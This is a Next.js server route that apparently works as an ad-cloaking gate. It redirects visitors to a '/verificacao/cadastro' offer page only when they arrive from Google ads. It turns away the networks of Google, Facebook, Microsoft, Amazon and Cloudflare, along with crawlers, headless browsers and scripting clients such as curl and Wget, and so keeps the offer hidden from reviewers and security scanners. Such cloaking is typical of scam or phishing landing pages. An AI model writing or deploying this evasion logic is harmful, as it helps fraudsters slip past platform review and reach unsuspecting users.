import { NextResponse } from 'next/server';

const OFFER_URL = '/verificacao/cadastro';

const BLACKLIST_ASN = [15169, 32934, 54115, 8075, 16509, 14618, 46475, 20940, 4766];

const BLACKLIST_IP = [
    '8.8.8.8', '1.1.1.1', '127.0.0.1', '0.0.0.0', '::1',
    '10.', '192.168.', '172.16.', '169.254.', '100.64.', '198.18.', '198.51.', '203.0.113.'
];

function getRealIP(req: Request) {
    const headers = req.headers;
    const cf = headers.get('cf-connecting-ip');
    const xff = headers.get('x-forwarded-for');
    const client = headers.get('client-ip') || headers.get('x-real-ip');
    if (cf) return cf.split(',')[0].trim();
    if (xff) return xff.split(',')[0].trim();
    if (client) return client.split(',')[0].trim();
    return '0.0.0.0';
}

async function getASN(ip: string) {
    try {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), 2000);
        const res = await fetch(`https://ipinfo.io/${ip}/json`, { signal: controller.signal });
        clearTimeout(id);
        if (!res.ok) return null;
        const data = await res.json();
        if (data?.org) {
            const m = String(data.org).match(/AS(\d+)/i);
            if (m) return Number(m[1]);
        }
        if (data?.country && data.country !== 'BR') return 'FORA';
        return null;
    } catch {
        return null;
    }
}

function isSuspiciousBrowser(ua: string) {
    if (!ua) return false;
    const block = ['Linux x86_64', 'HeadlessChrome', 'PhantomJS', 'Selenium', 'Python', 'bot', 'spider', 'crawler', 'Go-http-client', 'Scrapy', 'Wget', 'curl', 'fetch', 'axios', 'httpclient', 'libwww', 'ruby', 'mechanize', 'perl', 'node', 'httprequest'];
    for (const s of block) if (ua.toLowerCase().includes(s.toLowerCase())) return true;
    return false;
}

function inBlacklistIP(ip: string, blacklist: string[]) {
    if (!ip) return false;
    for (const block of blacklist) {
        if (ip === block) return true;
        if (ip.startsWith(block)) return true;
    }
    return false;
}

function isLikelyBot(ua: string, acceptLang: string | null, referer: string | null) {
    if (ua && /bot|crawler|spider/i.test(ua)) return true;
    if ((!referer || referer.length === 0) && (!acceptLang || acceptLang.length < 2)) return true;
    return false;
}

function isGoogleReferer(referer: string | null, url: URL) {
    const hasGclid = url.searchParams.has('gclid');
    const isGoogleDomain = referer && (referer.includes('://www.google.') || referer.includes('://google.'));
    return Boolean(isGoogleDomain) || hasGclid;
}

function isAppAgent(ua: string) {
    if (!ua) return false;
    const apps = ['WhatsApp', 'Instagram', 'FBAV', 'Messenger'];
    for (const a of apps) if (ua.includes(a)) return true;
    return false;
}

export async function GET(req: Request) {
    const url = new URL(req.url);

    const ip = getRealIP(req);
    const asnRaw = await getASN(ip);
    const asn = (asnRaw === null || asnRaw === 'FORA') ? 0 : asnRaw;

    const ua = req.headers.get('user-agent') || '';
    const acceptLang = req.headers.get('accept-language');
    const referer = req.headers.get('referer');

    const blockedByUA = isSuspiciousBrowser(ua);
    const blockedByASN = asn && typeof asn === 'number' && BLACKLIST_ASN.includes(asn as number);
    const blockedByIP = inBlacklistIP(ip, BLACKLIST_IP);
    const likelyBot = isLikelyBot(ua, acceptLang, referer);
    const googleRef = isGoogleReferer(referer, url);
    const appAgent = isAppAgent(ua);

    const reasons: string[] = [];
    if (blockedByUA) reasons.push('ua');
    if (blockedByASN) reasons.push('asn');
    if (blockedByIP) reasons.push('ip');
    if (likelyBot) reasons.push('likely_bot');
    if (appAgent) reasons.push('app_agent');
    if (!googleRef) reasons.push('no_google_ref');

    const isBlocked = reasons.length > 0;

    if (!isBlocked) {
        return NextResponse.json({ redirect: true, destination: OFFER_URL, reasons: [] });
    }

    return NextResponse.json({ redirect: false, reasons });
}
